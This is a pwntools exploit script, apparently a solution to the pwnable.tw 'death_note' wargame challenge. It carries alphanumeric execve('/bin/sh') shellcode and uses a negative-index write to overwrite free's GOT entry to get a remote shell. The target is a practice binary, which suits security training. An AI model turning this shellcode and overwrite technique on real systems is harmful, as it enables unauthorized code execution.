from pwn import *

pwnable = './death_note'

elf = ELF(pwnable)

context(terminal=['tmux', 'new-window'])

context.log_level = 'DEBUG'


debug_set_1 = '''
    set {int}0x0804b108 = 0x804b0c0
    b fclose

    b *0xf7e7cfa5
    commands
        set {char [8]} 0x0804b0c0="/bin/sh"
        set $eax=0x0804b0c0
        set {int} 0x804b0c8=0xf7e5a940
    end
    '''

debug_set_2 = '''
    b *0xf7f3d4c2
    commands
        set {char [8]} 0x0804b064="/bin/sh"
    end
    '''

debug_set_3 = '''
    b *0x08048872
    '''

if len(sys.argv) > 2 and sys.argv[1] == 'debug':
    p = process(pwnable)
    gdb.attach(p, debug_set_3)
elif len(sys.argv) > 1 and sys.argv[1] == 'debug':
    p = process(pwnable)
    gdb.attach(p, debug_set_3)
else:
    #p = process(pwnable)
    p = remote('chall.pwnable.tw', 10201)


def add(index, name):
    p.recvuntil(":")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(index)
    p.recvuntil(":")
    p.sendline(name)


def remove(index):
    p.recvuntil(":")
    p.sendline("3")
    p.recvuntil(":")
    p.sendline(index)

def show(index):
    p.recvuntil(":")
    p.sendline("2")
    p.recvuntil(":")
    p.sendline(index)

#free 0x804a014

shellcode_1 = '''
        push eax
        pop ecx
        push 0x6a
        pop eax
        xor al, 0x6a
        dec eax


        xor ax, 0x4f65
        xor ax, 0x3057
        push eax

        push   0x45
        pop    eax
        xor    al, 0x45
        push   0x68732f2f
        push   0x6e69622f
        ''' 

shellcode_2 = '''
        push eax
        pop ecx
        push 0x6a
        pop eax
        xor al, 0x6a
        inc eax
        sub DWORD PTR [ecx+0x50], eax
        push 0x4f654f65
        pop eax
        xor DWORD PTR [ecx+0x50], eax
        push 0x30573057
        pop eax
        xor DWORD PTR [ecx+0x50], eax
        push 0x6a
        pop eax
        xor al, 0x6a
        push ecx
        pop ebx
        push 0x6a
        pop eax
        xor al, 0x6a
        push eax
        pop ecx
        push 0x6a
        pop eax
        xor al, 0x6a
	inc eax
	inc eax
	inc eax
	inc eax
	inc eax
	inc eax
	inc eax
	inc eax
	inc eax
	inc eax
	inc eax
	inc edi
	inc edi
	inc edi
	inc edi
	inc edi
        '''

shellcode = asm(shellcode_2)

print(shellcode)

add("1", "/bin/sh")
add("-19", shellcode)
remove("1")

#p.wait_for_close()
p.interactive()
